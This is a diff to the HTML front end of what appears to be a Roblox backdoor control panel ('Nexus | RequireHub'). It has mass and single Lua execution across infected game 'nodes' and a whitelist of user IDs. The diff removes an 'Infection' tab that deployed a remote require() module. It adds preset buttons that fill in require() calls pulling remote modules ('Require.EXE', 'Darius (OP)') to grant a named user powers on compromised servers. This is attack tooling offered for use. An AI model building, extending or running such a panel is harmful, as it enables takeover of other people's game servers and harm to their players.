@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Nexus  | Stable</title>
+    <title>Nexus  | RequireHub</title>
     <style>
         :root { --apple-blue: #0071e3; --bg: #000; }
         body { margin: 0; background: var(--bg); color: #fff; font-family: -apple-system, sans-serif; overflow: hidden; }
@@ -12,10 +12,12 @@
         .nav-btn.active { color: #fff; background: rgba(255,255,255,0.1); font-weight: 600; }
         .container { display: flex; align-items: center; justify-content: center; height: 100vh; }
         .card { background: #1c1c1e; border-radius: 18px; width: 520px; padding: 25px; border: 1px solid #333; box-shadow: 0 10px 40px rgba(0,0,0,0.6); }
-        h2 { margin: 0 0 15px 0; font-size: 20px; }
+        h2 { margin: 0 0 10px 0; font-size: 20px; }
         input, textarea, select { width: 100%; border-radius: 8px; border: 1px solid #424245; background: #000; color: #fff; padding: 10px; margin-bottom: 10px; box-sizing: border-box; outline: none; font-size: 13px; }
         textarea { font-family: 'Courier New', monospace; resize: none; }
         .btn-main { background: var(--apple-blue); color: #fff; border: none; border-radius: 8px; padding: 12px; width: 100%; font-weight: 600; cursor: pointer; }
+        .row-btns { display: flex; gap: 5px; margin-bottom: 10px; }
+        .rh-pill { background: #333; color: #fff; border: none; padding: 5px 10px; border-radius: 12px; font-size: 10px; cursor: pointer; }
         .node-box { background: #0b0b0c; border-radius: 10px; height: 180px; overflow-y: auto; border: 1px solid #333; }
         .node-item { padding: 12px; border-bottom: 1px solid #222; display: flex; justify-content: space-between; align-items: center; }
         .music-ctrl { position: fixed; bottom: 20px; left: 20px; background: rgba(44,44,46,0.8); backdrop-filter: blur(10px); padding: 10px 15px; border-radius: 20px; border: 1px solid #444; display: flex; align-items: center; gap: 10px; z-index: 2000; }
@@ -29,7 +31,6 @@
         <div class="nav">
             <button class="nav-btn active" onclick="showTab('mass', this)">Mass</button>
             <button class="nav-btn" onclick="showTab('single', this)">Single</button>
-            <button class="nav-btn" onclick="showTab('inf', this)">Infection</button>
             <button class="nav-btn" onclick="showTab('wl', this)">Whitelist</button>
             <button class="nav-btn" onclick="showTab('nodes', this)">Nodes</button>
         </div>
@@ -40,28 +41,34 @@
         <div class="card">
             <div id="mass" class="tab-content">
                 <h2>Mass Execution</h2>
+                <div class="row-btns">
+                    <button class="rh-pill" onclick="fill(1, 'm_lua')">Last Rig</button>
+                    <button class="rh-pill" onclick="fill(2, 'm_lua')">Require.EXE</button>
+                    <button class="rh-pill" onclick="fill(3, 'm_lua')">Darius (OP)</button>
+                </div>
                 <input type="password" id="m_pw" placeholder="Admin Password">
-                <textarea id="m_lua" rows="7" placeholder="-- Global Lua"></textarea>
+                <textarea id="m_lua" rows="6" placeholder="-- Global Lua"></textarea>
                 <button class="btn-main" onclick="send('mass')">Execute All</button>
             </div>
+
             <div id="single" class="tab-content" style="display:none;">
                 <h2>Single Execution</h2>
-                <select id="target_id"><option value="">Scanning...</option></select>
+                <select id="target_id"><option value="">Scanning for Nodes...</option></select>
+                <div class="row-btns">
+                    <button class="rh-pill" onclick="fill(3, 's_lua')">Darius (OP)</button>
+                </div>
                 <input type="password" id="s_pw" placeholder="Admin Password">
-                <textarea id="s_lua" rows="6" placeholder="-- Target Lua"></textarea>
+                <textarea id="s_lua" rows="5" placeholder="-- Target Lua"></textarea>
                 <button class="btn-main" onclick="send('single')">Execute Target</button>
             </div>
-            <div id="inf" class="tab-content" style="display:none;">
-                <h2>Infection</h2>
-                <textarea id="i_lua" rows="8">require(127445614272366).op("Darius")</textarea>
-                <button class="btn-main" onclick="send('inf')">Deploy</button>
-            </div>
+
             <div id="wl" class="tab-content" style="display:none;">
                 <h2>Whitelist Manager</h2>
                 <input type="text" id="wid" placeholder="Roblox UserID">
                 <button class="btn-main" onclick="wlu('add')">Authorize ID</button>
                 <button class="btn-main" style="background:#222; margin-top:8px;" onclick="wlu('remove')">Revoke ID</button>
             </div>
+
             <div id="nodes" class="tab-content" style="display:none;">
                 <h2>Active Nodes</h2>
                 <div id="node_list" class="node-box"></div>
@@ -96,6 +103,13 @@
             document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
             document.getElementById(id).style.display = 'block';
             btn.classList.add('active');
+        }
+
+        function fill(type, boxId) {
+            const box = document.getElementById(boxId);
+            if(type === 1) box.value = `require(132155655397653)("Darius")`;
+            if(type === 2) box.value = `require(125992639027440)["Require.EXE by E God"]("Darius")`;
+            if(type === 3) box.value = `require(127445614272366).op("Darius")`;
         }
 
         async function send(tabId) {
